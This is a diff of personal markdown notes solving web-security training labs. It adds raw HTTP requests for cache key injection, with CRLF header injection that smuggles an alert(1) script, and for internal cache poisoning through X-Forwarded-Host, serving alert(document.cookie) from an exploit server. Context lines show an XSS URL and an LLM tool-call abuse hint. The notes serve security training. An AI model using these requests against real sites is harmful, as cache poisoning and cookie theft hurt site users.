@@ -3610,14 +3610,46 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Deliver the link to victim
     `https://0a7e007f04ff0a3380a767ec005e001f.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E`
 - **Cache key injection (Expert)**
+  - identify unkeyed param: "utm_content"
+  - GET /js/localize.js?lang=en
+    vulnerable to client-side parameter pollution via the lang parameter because it doesn't URL-encode the value
+  - GET /js/localize.js?lang=en&cors=0
+    vulnerable to response header injection via the Origin request header, provided the cors parameter is set to 1  
+  - send request 1
+    ```
+    GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
+    Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
+
+    >> Readable text in below
+    Origin: x
+    Content-Length: 8
+
+    alert(1)$$$$
+    ```
+  - send request 2
+    ```
+    GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
+
+    >> Readable text in below
+    GET /login?lang=en?utm_content=x&cors=1&x=1$$origin=x
+    Content-Length: 8
+
+    alert(1)$$#
+    ```
+  - 
 - **Internal cache poisoning (Expert)**
-- dd
-- dd
-- dd
-- dd
-- dd
-- dd
-- dd
+  - Keep sending the request
+    ```
+    GET / 
+    X-Forwarded-Host: exploit-0a860086033b6635828482c5014800bf.exploit-server.net
+    ```
+  - most of the times, you will see 3 times exploit url found in response but /geolocate.js?callback=loadCountry remain same
+  - Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL
+  - Remove `X-Forwarded-Host` and resend the request. Notice that only 2 times exploit url found in response
+  - Exploit server
+    file: /js/geolocate.js
+    body: alert(document.cookie)
+  - Repeater > resend with X-Forwarded-Host untill all thress of the dynamic URLs in the resposne point to your exploit server  
 
 ## HTTP Host Header
 Content for HTTP Host Header...
